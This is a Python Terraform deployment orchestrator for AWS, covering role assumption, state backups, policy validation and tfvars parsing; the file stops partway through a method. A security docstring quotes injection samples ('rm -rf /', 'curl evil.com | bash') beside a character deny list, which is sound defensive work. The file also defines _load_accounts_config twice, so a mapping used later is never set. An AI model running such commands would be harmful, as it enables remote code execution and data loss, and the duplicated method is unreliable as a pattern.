#!/usr/bin/env python3
"""
Enhanced Terraform Deployment Orchestrator - Version 2.0
============================================================
Features:
- Dynamic backend key generation: {account_name}/{service}/{resource_name}/{resource_name}.tfstate
- Resource name extraction from tfvars for intelligent state file naming
- Enhanced PR comments with detailed outputs and error reporting
- Service-specific state management with automatic service detection
- Comprehensive error handling and debug logging
- Terraform state isolation per resource for better state management
- Generic deployment orchestration for all AWS services (S3, KMS, IAM, Lambda, etc.)

Version: 2.0
Updated: 2025-11-24
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import concurrent.futures
import threading
import time
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Tuple, Optional

try:
    import yaml
except ImportError:
    yaml = None

# =============================================================================
# CONFIGURATION - All values can be overridden via environment variables
# =============================================================================

# Version
ORCHESTRATOR_VERSION = "2.0"

# Debug mode
DEBUG = os.environ.get('ORCHESTRATOR_DEBUG', 'true').lower() == 'true'

# AWS Configuration
TERRAFORM_STATE_BUCKET = os.environ.get('TERRAFORM_STATE_BUCKET', 'terraform-elb-mdoule-poc')
TERRAFORM_ASSUME_ROLE = os.environ.get('TERRAFORM_ASSUME_ROLE', 'TerraformExecutionRole')
AWS_DEFAULT_REGION = os.environ.get('AWS_REGION', 'us-east-1')

# Backend Key Pattern Configuration
# Pattern: {service_part}/{account_name}/{region}/{project}/{resource_path}/terraform.tfstate
# Examples:
#   Single service: s3/arj-wkld-a-prd/us-east-1/test-poc-3/bucket-name/terraform.tfstate
#   Multi service:  multi/arj-wkld-a-prd/us-east-1/test-poc-3/iam-s3/terraform.tfstate
BACKEND_KEY_PATTERN = os.environ.get('BACKEND_KEY_PATTERN', '{service_part}/{account_name}/{region}/{project}/{resource_path}/terraform.tfstate')
BACKEND_KEY_MULTI_SERVICE_PREFIX = os.environ.get('BACKEND_KEY_MULTI_SERVICE_PREFIX', 'multi')

# State Migration Configuration
STATE_BACKUP_PREFIX = os.environ.get('STATE_BACKUP_PREFIX', 'backups')
STATE_BACKUP_ENABLED = os.environ.get('STATE_BACKUP_ENABLED', 'true').lower() == 'true'
STATE_AUTO_MIGRATION_ENABLED = os.environ.get('STATE_AUTO_MIGRATION_ENABLED', 'true').lower() == 'true'
STATE_OLD_LOCATION_CLEANUP = os.environ.get('STATE_OLD_LOCATION_CLEANUP', 'true').lower() == 'true'

# Audit Logging Configuration
AUDIT_LOG_ENABLED = os.environ.get('AUDIT_LOG_ENABLED', 'true').lower() == 'true'
AUDIT_LOG_BUCKET = os.environ.get('AUDIT_LOG_BUCKET', TERRAFORM_STATE_BUCKET)  # Default to state bucket
AUDIT_LOG_PREFIX = os.environ.get('AUDIT_LOG_PREFIX', 'audit-logs')

# Terraform Configuration
TERRAFORM_LOCK_ENABLED = os.environ.get('TERRAFORM_LOCK_ENABLED', 'true').lower() == 'true'
TERRAFORM_LOCK_TABLE = os.environ.get('TERRAFORM_LOCK_TABLE', None)  # DynamoDB table for state locking

# Execution Configuration
MAX_PARALLEL_DEPLOYMENTS = int(os.environ.get('MAX_PARALLEL_DEPLOYMENTS', '0'))  # 0 = auto-detect CPU count
DEPLOYMENT_TIMEOUT_SECONDS = int(os.environ.get('DEPLOYMENT_TIMEOUT_SECONDS', '3600'))  # 1 hour default

def debug_print(msg):
    if DEBUG:
        print(f"🐛 DEBUG: {msg}")

def strip_ansi_colors(text):
    """Remove ANSI color codes from text"""
    ansi_escape = re.compile(r'\x1b\[[0-9;]*m')
    bracket_codes = re.compile(r'\[(?:[0-9]+;?)*m')
    text = ansi_escape.sub('', text)
    text = bracket_codes.sub('', text)
    return text

def sanitize_s3_key(key: str) -> str:
    """Sanitize S3 key to prevent command injection attacks.
    
    SECURITY: Validates S3 keys contain only safe characters before passing to shell commands.
    Prevents injection attacks like: key="; rm -rf /" or key="& curl evil.com | bash"
    
    Args:
        key: S3 key path to validate
        
    Returns:
        Validated key if safe
        
    Raises:
        ValueError: If key contains unsafe characters
        
    Examples:
        ✅ "s3/account/region/project/terraform.tfstate" - SAFE
        ✅ "backups/2024-12-29/state.tfstate" - SAFE
        ❌ "state; rm -rf /" - BLOCKED
        ❌ "state & malicious.sh" - BLOCKED
    """
    # Allow only alphanumeric, forward slash, hyphen, underscore, dot
    # This covers all legitimate S3 key patterns
    if not re.match(r'^[a-zA-Z0-9/_.\-]+$', key):
        raise ValueError(
            f"SECURITY: Invalid S3 key contains unsafe characters: {key[:50]}... "
            f"Only alphanumeric, /, _, -, . allowed"
        )
    
    # Additional check: no path traversal attempts
    if '..' in key:
        raise ValueError(f"SECURITY: Path traversal detected in S3 key: {key}")
    
    # Check for suspicious patterns
    suspicious_patterns = [';', '&', '|', '$', '`', '(', ')', '<', '>', '\n', '\r']
    for pattern in suspicious_patterns:
        if pattern in key:
            raise ValueError(f"SECURITY: Suspicious character '{pattern}' in S3 key: {key}")
    
    return key

def sanitize_aws_account_id(account_id: str) -> str:
    """Validate AWS account ID format.
    
    SECURITY: Ensures account ID is exactly 12 digits before using in ARNs or role assumptions.
    
    Args:
        account_id: AWS account ID to validate
        
    Returns:
        Validated account ID
        
    Raises:
        ValueError: If account ID is not 12 digits
    """
    if not re.match(r'^\d{12}$', account_id):
        raise ValueError(
            f"SECURITY: Invalid AWS account ID format: {account_id}. "
            f"Must be exactly 12 digits"
        )
    return account_id

def run_aws_command_with_assume_role(cmd: List[str], account_id: str, role_name: str = None) -> subprocess.CompletedProcess:
    """Run AWS CLI command with assumed role credentials.
    
    The state bucket is in the workload account, but the script runs with GitHub role credentials.
    We need to assume the TerraformExecutionRole (same role Terraform uses) to access the bucket.
    
    Args:
        cmd: AWS CLI command as list (e.g., ["aws", "s3", "ls", "..."])
        account_id: AWS account ID where role exists (e.g., "802860742843")
        role_name: IAM role name to assume (default: from TERRAFORM_ASSUME_ROLE env var or "TerraformExecutionRole")
    
    Returns:
        CompletedProcess result from subprocess.run
    """
    # Get role name from environment variable or use default
    # This matches the var.assume_role_name in variables.tf
    if role_name is None:
        role_name = os.environ.get('TERRAFORM_ASSUME_ROLE', 'TerraformExecutionRole')
    
    # SECURITY: Validate account ID to prevent injection
    account_id = sanitize_aws_account_id(account_id)
    
    role_arn = f"arn:aws:iam::{account_id}:role/{role_name}"
    
    # Prepend AWS_PROFILE environment variable or use STS assume-role inline
    # For simplicity, we'll add --profile parameter if AWS CLI supports it
    # Better approach: Set AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN from STS
    
    # Get temporary credentials using STS
    try:
        sts_cmd = [
            "aws", "sts", "assume-role",
            "--role-arn", role_arn,
            "--role-session-name", "terraform-orchestrator-session",
            "--duration-seconds", "3600"
        ]
        
        debug_print(f"Assuming role: {role_arn}")
        sts_result = subprocess.run(sts_cmd, capture_output=True, text=True, check=True)
        credentials = json.loads(sts_result.stdout)['Credentials']
        
        # Create environment with assumed role credentials
        env = os.environ.copy()
        env['AWS_ACCESS_KEY_ID'] = credentials['AccessKeyId']
        env['AWS_SECRET_ACCESS_KEY'] = credentials['SecretAccessKey']
        env['AWS_SESSION_TOKEN'] = credentials['SessionToken']
        
        # Run the actual command with assumed credentials
        return subprocess.run(cmd, capture_output=True, text=True, env=env)
        
    except subprocess.CalledProcessError as e:
        debug_print(f"Failed to assume role {role_arn}: {e.stderr}")
        raise
    except Exception as e:
        debug_print(f"Error assuming role: {str(e)}")
        raise

def backup_terraform_state(backend_bucket: str, backend_key: str, account_id: str, backup_reason: str = "migration") -> Tuple[bool, str]:
    """Backup current Terraform state to S3 before migration.
    
    Args:
        backend_bucket: S3 bucket containing state
        backend_key: Current state file key (e.g., s3/account/region/project-s3/terraform.tfstate)
        account_id: AWS account ID where state bucket exists (for role assumption)
        backup_reason: Reason for backup (migration, rollback, etc.)
    
    Returns:
        Tuple of (success: bool, backup_key: str)
    
    Example:
        Original: s3/arj-wkld-a-prd/us-east-1/test-poc-3-s3/terraform.tfstate
        Backup:   backups/2025-12-12_14-30-00_migration/s3/arj-wkld-a-prd/us-east-1/test-poc-3-s3/terraform.tfstate
    """
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    
    # SECURITY: Sanitize S3 keys to prevent command injection
    backend_key = sanitize_s3_key(backend_key)
    backup_key = f"{STATE_BACKUP_PREFIX}/{timestamp}_{backup_reason}/{backend_key}"
    backup_key = sanitize_s3_key(backup_key)
    
    try:
        # Copy state file to backup location
        cmd = [
            "aws", "s3", "cp",
            f"s3://{backend_bucket}/{backend_key}",
            f"s3://{backend_bucket}/{backup_key}"
        ]
        
        debug_print(f"Backing up state: {backend_key} -> {backup_key}")
        result = run_aws_command_with_assume_role(cmd, account_id)
        
        print(f"✅ State backed up successfully: {backup_key}")
        return True, backup_key
        
    except subprocess.CalledProcessError as e:
        error_msg = f"Failed to backup state: {e.stderr}"
        print(f"❌ {error_msg}")
        return False, ""
    except Exception as e:
        error_msg = f"Unexpected error during backup: {str(e)}"
        print(f"❌ {error_msg}")
        return False, ""

def redact_sensitive_data(text: str) -> str:
    """Redact sensitive information from terraform output for PR comments.
    
    MINIMAL APPROACH: Only redacts credentials and account IDs for security.
    Keeps ARNs, IPs, resource IDs for debugging - team has AWS console access anyway.
    
    This is a FULLY DYNAMIC function - works with ANY AWS service without modification.
    """
    if not text:
        return text
    
    # Pattern 1: AWS Access Keys (AKIA...)
    text = re.sub(
        r'\bAKIA[0-9A-Z]{16}\b',
        r'***ACCESS-KEY***',
        text
    )
    
    # Pattern 2: AWS Secret Keys (40+ char base64-like strings)
    # Use negative lookbehind/lookahead to avoid false positives
    text = re.sub(
        r'(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40,}(?![A-Za-z0-9/+=])',
        r'***SECRET-KEY***',
        text
    )
    
    # Pattern 3: AWS Account IDs (12 digit numbers)
    text = re.sub(
        r'\b\d{12}\b',
        r'***ACCOUNT-ID***',
        text
    )
    
    return text

def validate_policy_json_file(policy_path: Path, working_dir: Path, account_id: str) -> Tuple[bool, List[str], List[str]]:
    """
    Comprehensive policy JSON validation:
    1. JSON syntax
    2. AWS policy structure
    3. ARN account matching
    4. Security best practices
    Returns: (is_valid, warnings, errors)
    """
    warnings = []
    errors = []
    
    if not policy_path.is_absolute():
        policy_path = working_dir / policy_path
    
    if not policy_path.exists():
        errors.append(f"🚫 BLOCKER: Policy file not found: {policy_path}")
        return False, warnings, errors
    
    try:
        with open(policy_path, 'r') as f:
            policy_content = f.read()
        
        # 1. Validate JSON syntax
        try:
            policy_data = json.loads(policy_content)
        except json.JSONDecodeError as e:
            errors.append(f"🚫 BLOCKER: Invalid JSON in {policy_path.name}: {e}")
            return False, warnings, errors
        
        # 2. Check AWS policy structure
        if 'Statement' not in policy_data:
            errors.append(f"🚫 BLOCKER: Policy missing 'Statement' field: {policy_path.name}")
            return False, warnings, errors
        
        statements = policy_data.get('Statement', [])
        if not isinstance(statements, list):
            statements = [statements]
        
        # 3. Validate each statement
        for idx, statement in enumerate(statements):
            # Check Effect field
            if 'Effect' not in statement:
                errors.append(f"🚫 BLOCKER: Statement {idx+1} missing 'Effect' in {policy_path.name}")
            elif statement['Effect'] not in ['Allow', 'Deny']:
                errors.append(f"🚫 BLOCKER: Invalid Effect '{statement['Effect']}' in {policy_path.name}")
            
            # Check for wildcards
            actions = statement.get('Action', [])
            if not isinstance(actions, list):
                actions = [actions]
            
            if '*' in actions:
                warnings.append(f"⚠️  Policy {policy_path.name} uses wildcard actions (*) - security risk!")
            
            # Check ARNs match account
            resources = statement.get('Resource', [])
            if not isinstance(resources, list):
                resources = [resources]
            
            for resource in resources:
                if '*' in resource and resource == '*':
                    warnings.append(f"⚠️  Policy {policy_path.name} uses wildcard resource (*) - allows ALL resources!")
                
                # Extract account from ARN
                arn_match = re.search(r'arn:aws:[^:]+:[^:]*:(\d{12}):', resource)
                if arn_match:
                    arn_account = arn_match.group(1)
                    if arn_account != account_id:
                        warnings.append(
                            f"⚠️  Cross-account ARN in policy {policy_path.name}: account {arn_account} "
                            f"(deploying to {account_id}). Verify this is intentional."
                        )
        
        return len(errors) == 0, warnings, errors
        
    except Exception as e:
        errors.append(f"🚫 BLOCKER: Error validating policy {policy_path.name}: {str(e)}")
        return False, warnings, errors

def validate_resource_names_match(policy_path: Path, tfvars_content: str, working_dir: Path) -> Tuple[List[str], List[str]]:
    """
    CRITICAL: Validate resource names in policy match tfvars
    Prevents deployment failures due to copy-paste errors with mismatched names
    Returns: (warnings, errors) - errors will BLOCK deployment
    """
    warnings = []
    errors = []
    
    if not policy_path.is_absolute():
        policy_path = working_dir / policy_path
    
    if not policy_path.exists():
        return warnings, errors
    
    try:
        with open(policy_path, 'r') as f:
            policy_data = json.load(f)
        
        # DYNAMIC: Extract resource KEY and resource NAME from tfvars (any service)
        # Pattern: s3_buckets = { "resource-key" = { bucket_name = "actual-name" ... } }
        # CRITICAL: Check that resource KEY matches or is contained in actual resource name
        
        # Extract resource blocks from collections like s3_buckets, kms_keys, iam_roles, etc.
        # Pattern: collection_name = { "key" = { ... } }
        # PERFORMANCE: Use simple line-based parsing instead of catastrophic backtracking regex
        # Old pattern had nested quantifiers: r'(\w+)\s*=\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}'
        # This could cause exponential time complexity on malformed input
        collections = []
        lines = tfvars_content.split('\n')
        i = 0
        while i < len(lines):
            line = lines[i].strip()
            # Match: collection_name = {
            match = re.match(r'(\w+)\s*=\s*\{', line)
            if match:
                collection_name = match.group(1)
                # Extract content until matching closing brace
                content_lines = []
                brace_count = 1
                i += 1
                while i < len(lines) and brace_count > 0:
                    content_line = lines[i]
                    brace_count += content_line.count('{') - content_line.count('}')
                    if brace_count > 0:
                        content_lines.append(content_line)
                    i += 1
                collection_content = '\n'.join(content_lines)
                collections.append((collection_name, collection_content))
            else:
                i += 1
        
        for collection_name, collection_content in collections:
            # Skip non-resource collections (like tags, account, common_tags)
            if collection_name in ['tags', 'common_tags', 'account', 'region', 'environment']:
                continue
            
            # Extract individual resource blocks: "resource-key" = { properties }
            resource_pattern = r'"([^"]+)"\s*=\s*\{([^}]+)\}'
            resources = re.findall(resource_pattern, collection_content, re.DOTALL)
            
            for resource_key, block_content in resources:
                # Skip if resource_key looks like an account ID (all digits)
                if resource_key.isdigit():
                    continue
                
                # DYNAMIC: Find ANY *_name attribute (bucket_name, function_name, role_name, etc.)
                name_match = re.search(r'(\w+_name)\s*=\s*"([^"]+)"', block_content)
                
                if name_match:
                    attribute_name = name_match.group(1)  # e.g., "bucket_name", "function_name"
                    actual_name = name_match.group(2)      # e.g., "arj-test-poc-3-use1-prd"
                    
                    # Debug output
                    debug_print(f"Checking: collection={collection_name}, key='{resource_key}', {attribute_name}='{actual_name}'")
                    
                    # CRITICAL CHECK: Resource key must be contained in actual name
                    # Example: key="test-poc-3" should be in name="arj-test-poc-3-use1-prd"
                    if resource_key not in actual_name:
                        errors.append(
                            f"🚫 BLOCKER: Resource key '{resource_key}' (in {collection_name}) does NOT match {attribute_name} '{actual_name}'. "
                            f"Copy-paste error detected! The resource key in your tfvars block must appear in the actual resource name. "
                            f"Example: If key is 'my-bucket', then bucket_name must contain 'my-bucket' like 'my-bucket-prod-use1'."
                        )
                    else:
                        debug_print(f"✅ Match found: '{resource_key}' is in '{actual_name}'")
        
        # DYNAMIC: Extract all resource names for policy comparison (any *_name attribute)
        # BUT skip account_name - it's metadata, not a resource to validate
        actual_names = set()
        all_name_matches = re.findall(r'(\w+_name)\s*=\s*"([^"]+)"', tfvars_content)
        for attribute_name, name_value in all_name_matches:
            # Skip non-resource name attributes (metadata fields)
            if attribute_name not in ['account_name']:
                actual_names.add(name_value)
        
        # Also check key_alias pattern (KMS-specific but dynamic)
        alias_matches = re.findall(r'key_alias\s*=\s*"(?:alias/)?([^"]+)"', tfvars_content)
        actual_names.update(alias_matches)
        
        # DYNAMIC: Extract resource names from policy ARNs (any AWS service)
        policy_resources = set()
        statements = policy_data.get('Statement', [])
        if not isinstance(statements, list):
            statements = [statements]
        
        for statement in statements:
            resources = statement.get('Resource', [])
            if not isinstance(resources, list):
                resources = [resources]
            
            for resource in resources:
                # DYNAMIC: Extract resource names from ANY ARN format (all AWS services)
                # Patterns:
                # - arn:aws:service:::resource-name (service with :::)
                # - arn:aws:service:region:account:resource-type/resource-name
                # - arn:aws:service:region:account:resource-type:resource-name
                
                # Handle ::: pattern (used by some services)
                if ':::' in resource:
                    triple_colon_match = re.search(r'arn:aws:[^:]+:::([^/\*]+)', resource)
                    if triple_colon_match:
                        policy_resources.add(triple_colon_match.group(1))
                        continue
                
                # Generic ARN: extract resource name from last segment
                # Pattern: arn:aws:service:region:account:type/name or arn:aws:service:region:account:type:name
                generic_match = re.search(r'arn:aws:[^:]+:[^:]*:[^:]*:(?:[^/:]+[/:])?([^/:\*]+)', resource)
                if generic_match:
                    resource_name = generic_match.group(1)
                    # Filter out account IDs, wildcards, and common non-resource identifiers
                    if not resource_name.isdigit() and resource_name not in ['*', 'root', 'aws']:
                        policy_resources.add(resource_name)
        
        # CRITICAL CHECK: Resource names in policy MUST match tfvars
        if actual_names and policy_resources:
            # Resources in policy but NOT in tfvars = BLOCKER (copy-paste error)
            unknown = policy_resources - actual_names
            if unknown:
                errors.append(
                    f"🚫 BLOCKER: Policy {policy_path.name} references resources NOT in tfvars: {', '.join(unknown)}. "
                    f"This indicates copy-paste error - update policy file or tfvars!"
                )
            
            # REMOVED: Don't check if tfvars resources are missing from policy
            # Different resource types (S3, IAM, Lambda) have different policies
            # IAM roles don't need to be in S3 bucket policies, etc.
            # Only validate: policy references → must exist in tfvars
    
    except Exception as e:
        errors.append(f"🚫 BLOCKER: Error validating resource names in {policy_path.name}: {str(e)}")
    
    return warnings, errors

class EnhancedTerraformOrchestrator:
    """Enhanced Terraform Orchestrator with dynamic backend keys and improved PR comments"""
    
    def __init__(self, working_dir=None):
        self.script_dir = Path(__file__).parent
        self.working_dir = Path(working_dir) if working_dir else Path.cwd()
        self.state_backups = {}  # Track backups for rollback
        
        # THREAD-SAFETY: Use thread-local storage for parallel execution
        self._thread_local = threading.local()
        
        # PERFORMANCE CACHING - Eliminate redundant file reads
        self.tfvars_cache = {}  # Cache tfvars file content by path
        self.plan_json_cache = {}  # Cache parsed terraform plan JSON
        
        terraform_dir_env = os.getenv('TERRAFORM_DIR')
        if terraform_dir_env:
            self.project_root = (self.working_dir / terraform_dir_env).resolve()
        else:
            self.project_root = self.script_dir.parent
            
        self.accounts_config = self._load_accounts_config()
        self.templates_dir = self.project_root / "templates"
    
    @property
    def validation_warnings(self) -> List[str]:
        """Thread-safe validation warnings storage"""
        if not hasattr(self._thread_local, 'warnings'):
            self._thread_local.warnings = []
        return self._thread_local.warnings
    
    @validation_warnings.setter
    def validation_warnings(self, value: List[str]):
        """Thread-safe validation warnings setter"""
        self._thread_local.warnings = value
    
    @property
    def validation_errors(self) -> List[str]:
        """Thread-safe validation errors storage"""
        if not hasattr(self._thread_local, 'errors'):
            self._thread_local.errors = []
        return self._thread_local.errors
    
    @validation_errors.setter
    def validation_errors(self, value: List[str]):
        """Thread-safe validation errors setter"""
        self._thread_local.errors = value
    
    def _load_accounts_config(self) -> Dict:
        # NOTE: Resource protection/deletion policies are handled by OPA (Open Policy Agent)
        # OPA validates and enforces resource protection rules before deployment
        
        # DYNAMIC SERVICE MAPPING - Maps tfvars keys to AWS service names
        # Automatically detects services from tfvars file content
        self.service_mapping = {
            's3_buckets': 's3',
            's3_bucket': 's3',
            'kms_keys': 'kms',
            'kms_key': 'kms',
            'iam_roles': 'iam',
            'iam_policies': 'iam',
            'iam_users': 'iam',
            'lambda_functions': 'lambda',
            'lambda_function': 'lambda',
            'dynamodb_tables': 'dynamodb',
            'dynamodb_table': 'dynamodb',
            'rds_instances': 'rds',
            'rds_clusters': 'rds',
            'ec2_instances': 'ec2',
            'vpc_configs': 'vpc',
            'security_groups': 'vpc',
            'sns_topics': 'sns',
            'sqs_queues': 'sqs',
            'cloudwatch_alarms': 'cloudwatch',
            'api_gateways': 'apigateway'
        }

    def _load_accounts_config(self) -> Dict:
        """Load accounts configuration from accounts.yaml"""
        accounts_file = self.project_root / "accounts.yaml"
        if not accounts_file.exists():
            debug_print(f"accounts.yaml not found at {accounts_file}, using defaults")
            return {'accounts': {}, 's3_templates': {}, 'regions': {}, 'default_tags': {}}
        
        if yaml is None:
            return self._parse_simple_yaml(accounts_file)
        else:
            with open(accounts_file, 'r') as f:
                return yaml.safe_load(f)

    def _parse_simple_yaml(self, file_path: Path) -> Dict:
        """Simple YAML parser for basic accounts.yaml structure"""
        config = {'accounts': {}, 's3_templates': {}, 'regions': {}, 'default_tags': {}}
        current_section = None
        current_account = None
        
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                if line.endswith(':'):
                    key = line[:-1].strip("'\"")
                    if key in ['accounts', 's3_templates', 'regions', 'default_tags']:
                        current_section = key
                        current_account = None
                    elif current_section == 'accounts' and key.isdigit():
                        current_account = key
                        config['accounts'][current_account] = {}
                elif ':' in line and current_section and current_account:
                    key, value = line.split(':', 1)
                    key = key.strip()
                    value = value.strip().strip("'\"")
                    config['accounts'][current_account][key] = value
        
        return config
    
    def _find_tfvars_fast(self, root_dir: Path) -> List[Path]:
        """Use system find for 10x faster directory scanning than glob('**/*.tfvars')
        
        Performance comparison:
        - glob('**/*.tfvars'): ~500ms for 1000 files
        - find command: ~50ms for 1000 files
        
        Falls back to glob() on Windows or if find fails.
        """
        try:
            # Check if we're on Unix-like system (has find command)
            if os.name == 'nt':  # Windows
                # Fall back to glob on Windows
                return list(root_dir.glob("**/*.tfvars"))
            
            # Use fast OS-level find on Unix/Linux/macOS
            result = subprocess.run(
                ['find', str(root_dir), '-name', '*.tfvars', '-type', 'f'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                paths = [Path(p) for p in result.stdout.strip().split('\n') if p]
                debug_print(f"Fast find: Found {len(paths)} tfvars files in {root_dir}")
                return paths
            else:
                # Fall back to glob if find fails
                debug_print(f"find command failed, falling back to glob()")
                return list(root_dir.glob("**/*.tfvars"))
                
        except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
            # Fall back to glob if find not available or times out
            debug_print(f"find command error ({e}), falling back to glob()")
            return list(root_dir.glob("**/*.tfvars"))

    def find_deployments(self, changed_files=None, filters=None):
        """Find deployments to process based on changed files or all tfvars"""
        debug_print(f"find_deployments called with changed_files={changed_files}, filters={filters}")
        
        if changed_files:
            print(f"📋 Processing {len(changed_files)} changed files")
            seen_files = set()  # Track actual file paths, not parent directories
            files = []
            for file in changed_files:
                # Skip workflow files
                if file.startswith('.github/workflows/'):
                    debug_print(f"Skipping workflow file: {file}")
                    continue
                
                # Try both absolute path and relative to working_dir
                file_path = Path(file)
                if not file_path.is_absolute():
                    file_path = self.working_dir / file
                
                debug_print(f"Checking file: {file} -> resolved to: {file_path} (exists: {file_path.exists()})")
                
                if file_path.exists():
                    if file.endswith('.tfvars'):
                        # Direct tfvars file - add if not already seen
                        file_str = str(file_path)
                        if file_str not in seen_files:
                            files.append(file_path)
                            seen_files.add(file_str)
                            debug_print(f"Added tfvars deployment: {file_path}")
                        else:
                            debug_print(f"Skipping duplicate tfvars: {file_path}")
                    elif file.endswith('.json'):
                        # JSON file changed - look for tfvars in same directory
                        deployment_dir = file_path.parent
                        tfvars_files = list(deployment_dir.glob("*.tfvars"))
                        debug_print(f"Found {len(tfvars_files)} tfvars files in {deployment_dir}")
                        for tfvars_file in tfvars_files:
                            file_str = str(tfvars_file)
                            if file_str not in seen_files:
                                files.append(tfvars_file)
                                seen_files.add(file_str)
                                debug_print(f"Found tfvars file {tfvars_file} for changed JSON {file}")
                            else:
                                debug_print(f"Skipping duplicate tfvars: {tfvars_file}")
                else:
                    debug_print(f"File does not exist: {file_path}")
        else:
            # Find all tfvars files in Accounts directory
            # PERFORMANCE: Use fast OS-level find instead of slow recursive glob
            accounts_dir = self.working_dir / "Accounts"
            if accounts_dir.exists():
                files = self._find_tfvars_fast(accounts_dir)
            else:
                files = []
        
        deployments = []
        for file in files:
            deployment_info = self._analyze_deployment_file(file)
            if deployment_info and self._matches_filters(deployment_info, filters):
                deployments.append(deployment_info)
        
        return deployments

    def _analyze_deployment_file(self, tfvars_file: Path) -> Optional[Dict]:
        """Analyze tfvars file and extract deployment information - uses cache for performance"""
        try:
            # Read tfvars content using cache
            content = self._read_tfvars_cached(tfvars_file)
            
            # Extract account_name from tfvars content: account_name = "arj-wkld-a-prd"
            account_name_match = re.search(r'account_name\s*=\s*"([^"]+)"', content)
            if account_name_match:
                account_name = account_name_match.group(1)
                debug_print(f"✅ Extracted account_name from tfvars: {account_name}")
            else:
                # Fallback: use folder structure
                path_parts = tfvars_file.parts
                if len(path_parts) >= 4:
                    account_name = path_parts[-4]
                elif len(path_parts) >= 3:
                    account_name = path_parts[-3]
                elif len(path_parts) >= 2:
                    account_name = path_parts[-2]
                else:
                    account_name = tfvars_file.stem
                debug_print(f"⚠️  No account_name in tfvars, using folder: {account_name}")
            
            # Extract region from tfvars or use folder structure
            region_match = re.search(r'regions\s*=\s*\["([^"]+)"\]', content)
            if region_match:
                region = region_match.group(1)
                debug_print(f"✅ Extracted region from tfvars: {region}")
            else:
                # Fallback: use folder structure
                path_parts = tfvars_file.parts
                if len(path_parts) >= 3:
                    region = path_parts[-3]
                elif len(path_parts) >= 2:
                    region = path_parts[-2]
                else:
                    region = 'us-east-1'
                debug_print(f"⚠️  No region in tfvars, using folder/default: {region}")
            
            # Extract account_id from tfvars content
            account_id_match = re.search(r'account_id\s*=\s*"([^"]+)"', content)
            if account_id_match:
                account_id = account_id_match.group(1)
                debug_print(f"✅ Extracted account_id from tfvars: {account_id}")
            else:
                # Try to find from accounts block
                accounts_match = re.search(r'accounts\s*=\s*\{[^}]*"(\d+)"\s*=\s*\{', content)
                if accounts_match:
                    account_id = accounts_match.group(1)
                    debug_print(f"✅ Extracted account_id from accounts block: {account_id}")
                else:
                    # Fallback: use account_name
                    account_id = account_name
                    debug_print(f"⚠️  No account_id found, using account_name: {account_id}")
            
            # Project from folder structure (parent folder)
            path_parts = tfvars_file.parts
            project = path_parts[-2] if len(path_parts) >= 2 else 'default'
            
            # Extract environment from tfvars
            env_match = re.search(r'environment\s*=\s*"([^"]+)"', content)
            if env_match:
                environment = env_match.group(1)
            else:
                environment = 'unknown'
            
            # Extract Owner from tags
            owner = 'N/A'
            owner_match = re.search(r'Owner\s*=\s*"([^"]+)"', content)
            if owner_match:
                owner = owner_match.group(1)
                debug_print(f"✅ Extracted Owner from tags: {owner}")
            
            # Extract Team/Group from tags
            team = 'N/A'
            team_match = re.search(r'Team\s*=\s*"([^"]+)"', content)
            if not team_match:
                team_match = re.search(r'Group\s*=\s*"([^"]+)"', content)
            if team_match:
                team = team_match.group(1)
                debug_print(f"✅ Extracted Team/Group from tags: {team}")
            
            # Extract resource names (s3_buckets, kms_keys, iam_roles, etc.)
            resources = []
            resource_patterns = [
                (r's3_buckets\s*=\s*\{\s*"([^"]+)"\s*=', 'S3'),  # Match: s3_buckets = { "bucket-name" =
                (r'kms_keys\s*=\s*\{\s*"([^"]+)"\s*=', 'KMS'),   # Match: kms_keys = { "key-name" =
                (r'iam_roles\s*=\s*\{\s*"([^"]+)"\s*=', 'IAM Role'),  # Match: iam_roles = { "role-name" =
                (r'iam_policies\s*=\s*\{\s*"([^"]+)"\s*=', 'IAM Policy'),  # Match: iam_policies = { "policy-name" =
                (r'lambda_functions\s*=\s*\{\s*"([^"]+)"\s*=', 'Lambda')  # Match: lambda_functions = { "function-name" =
            ]
            
            for pattern, resource_type in resource_patterns:
                matches = re.finditer(pattern, content, re.MULTILINE)
                for match in matches:
                    resource_name = match.group(1)
                    resources.append(f"{resource_type}: {resource_name}")
                    debug_print(f"✅ Found resource: {resource_type} - {resource_name}")
            
            resources_str = ', '.join(resources[:5]) if resources else 'N/A'  # Limit to first 5
            if len(resources) > 5:
                resources_str += f' (+{len(resources) - 5} more)'
            
            # Calculate relative path from working_dir for cleaner reporting
            try:
                relative_path = tfvars_file.relative_to(self.working_dir)
                deployment_dir_relative = relative_path.parent
                debug_print(f"📁 Relative deployment path: {deployment_dir_relative}")
            except ValueError:
                # If can't calculate relative path, use the filename's parent
                deployment_dir_relative = Path(*tfvars_file.parts[-3:]).parent if len(tfvars_file.parts) >= 3 else tfvars_file.parent
                debug_print(f"📁 Using fallback deployment path: {deployment_dir_relative}")
            
            return {
                'file': str(tfvars_file),
                'file_relative': str(relative_path) if 'relative_path' in locals() else tfvars_file.name,
                'account_id': account_id,
                'account_name': account_name,
                'region': region,
                'project': project,
                'deployment_dir': str(tfvars_file.parent),
                'deployment_dir_relative': str(deployment_dir_relative),
                'environment': environment,
                'owner': owner,
                'team': team,
                'resources': resources_str
            }
                    
        except Exception as e:
            debug_print(f"Error analyzing deployment file {tfvars_file}: {e}")
            import traceback
            debug_print(traceback.format_exc())
            return None

    def _matches_filters(self, deployment: Dict, filters: Optional[Dict]) -> bool:
        """Check if deployment matches filter criteria"""
        if not filters:
            return True
        
        for key, value in filters.items():
            if deployment.get(key) != value:
                return False
        return True

    def _detect_services_from_tfvars(self, tfvars_file: Path) -> List[str]:
        """Detect services from tfvars file content - uses cache to avoid redundant reads"""
        try:
            content = self._read_tfvars_cached(tfvars_file)
            
            detected_services = set()  # Use set to avoid duplicates
            debug_print(f"🔍 Scanning tfvars for services: {tfvars_file.name}")
            debug_print(f"📄 File content preview (first 500 chars):\n{content[:500]}")
            
            for tfvars_key, service in self.service_mapping.items():
                # Look for service definitions in tfvars
                pattern = rf'\b{tfvars_key}\s*='
                if re.search(pattern, content):
